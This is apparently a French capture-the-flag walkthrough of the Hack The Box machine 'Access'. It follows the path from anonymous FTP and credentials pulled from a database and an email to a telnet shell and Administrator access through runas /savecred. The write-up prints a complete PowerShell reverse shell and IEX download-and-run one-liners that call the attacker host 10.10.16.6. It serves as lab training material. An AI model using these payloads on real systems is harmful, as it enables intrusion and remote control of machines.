# Access - Easy

```bash
Nmap scan report for 10.10.10.98
Host is up (0.022s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.95 seconds
```

Vu qu’on peut ftp en tant qu’anonyme on essaye de regarder ce qu’il y a, on trouve un fichier .mdb et un zip.

[https://stackoverflow.com/questions/377219/how-to-use-an-ms-access-file-from-linux](https://stackoverflow.com/questions/377219/how-to-use-an-ms-access-file-from-linux)

Il y a des problèmes avec les fichiers téléchargés via la commande ftp alors on utilise wget pour les récupérer:

```bash
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
```

Cette commande récupére tous les fichiers dispo, maintenant on peut lire les tables:

```bash
mdb-tables backup.mdb 
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
```

On remarque notamment la table auth_user que l’on exporte:

```bash
mdb-export backup.mdb auth_user 
```

Ceci nous drop ces données:

```bash
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

On arrive à décompressier le .zip avec le mdp de engineer. On obtient un fichier Microsoft Outlook Personal Folder file, qui contient des emails et on peut le lire comme ça:

```bash
readpst
```

On obtient un mail avec ce contenu:

```html
</o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
```

Evilwinrm ne passe pas mais telnet écoute donc on essaye. On obtient un shell et le flag user:

```bash
telnet -l security 10.10.10.98
```

On essaye d’upload winpeas mais pas possible car pas d’executable de DL, on trouve un dossier .yawcam mais rien d’intéressant, on essaye d’upgrade le shell en utilisant un script PS1

```powershell
$client = New-Object System.Net.Sockets.TCPClient( "10.10.16.6" ,4443); $stream =
$client .GetStream();[byte[]] $bytes = 0..65535|%{0}; while (( $i = $stream .Read( $bytes ,
0, $bytes .Length)) -ne 0){; $data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString( $bytes ,0, $i ); $sendback = (iex $data 2>&1 |
Out-String ); $sendback2 = $sendback + "PS " + ( pwd ).Path + "> " ; $sendbyte =
([text.encoding]::ASCII).GetBytes( $sendback2 ); $stream .Write( $sendbyte ,0, $sendbyte .L
ength); $stream .Flush()}; $client .Close()
```

```bash
### powershell "IEX(New-Object Net.Webclient).downloadstring('http://10.10.16.6:8000/shell.ps1')"
```

On trouve ceci dans une commande d’énumération:

```bash
cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

Ces passwords sauvegardés peuvent être utilisés pour des raccourcits, on utilise ces commandes pour énumérer:

```bash
Get-ChildItem "C:\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt
ForEach ( $file in gc .\shortcuts.txt) { Write-Output $file ; gc $file | Select-String runas }
```

Des lignes paraissent étrange:

```bash
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\ZKAccess3.5 Security System\Uninstall ZKAccess3.5 Security System.lnk                                                                                                                                    
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\ZKAccess3.5 Security System\ZKAccess3.5 Security System.lnk
C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk                                                                                                                                                                                                       
                                                                                                                                                                                                                                                              
L?F?@ ??7???7???#?P/P?O? ?:i?+00?/C:\R1M?:Windows???:?M?:*wWindowsV1MV?System32???:?MV?*?                                                                                                                                                                     
System32X2P?:?                                                                                                                                                                                                                                                
               runas.exe???:1??:1?*Yrunas.exeL-K??E?C:\Windows\System32\runas.exe#..\..\..\Windows\System3                                                                                                                                                    
2\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.                                                                                                                                 
5\img\AccessNET.ico?%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico                                                                                                                                                                                        
%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico                                                                                                                                                                                                            
                                                                                                                                                                                                                                                              
?%?                                                                                                                                                                                                                                                           
   ?wN??]N?D.??Q???`?Xaccess?_???8{E?3                                                                                                                                                                                                                        
                                      O?j)?H???                                                                                                                                                                                                               
                                               )??[?_???8{E?3                                                                                                                                                                                                 
                                                             O?j)?H???                                                                                                                                                                                        
                                                                      )??[?    ??1SPS??XF?L8C???&?m?e                                                                                                                                                         
*S-1-5-21-953262931-566350628-63446256-500
```

En allant dans C:\Users\Public on ne voit aucun Desktop mais si on cd on y arrive quand même. On peut alors 

```bash
runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.16.6:8000/shell.ps1')"
```

On obtient alors le flag final, il est aussi possible de les extraire avec mimikatz